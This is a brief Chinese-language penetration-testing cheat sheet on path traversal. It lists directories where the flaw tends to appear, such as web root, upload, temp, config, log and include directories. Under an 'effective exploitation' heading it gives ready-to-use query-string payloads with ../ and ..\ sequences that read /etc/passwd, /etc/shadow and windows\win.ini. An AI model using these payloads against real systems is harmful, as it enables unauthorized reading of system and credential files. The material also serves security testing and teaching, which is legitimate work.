# ✔️ 路径遍历 - Path Traversal

## 漏洞点

* Web根目录
* 上传目录
* 临时目录
* 配置文件目录
* 日志文件目录
* 包含文件目录

## 有效利用

```url
// Linux
?filename=../../../etc/passwd
?filename=../../../etc/shadow

// Windows
?filename=..\..\..\windows\win.ini
```
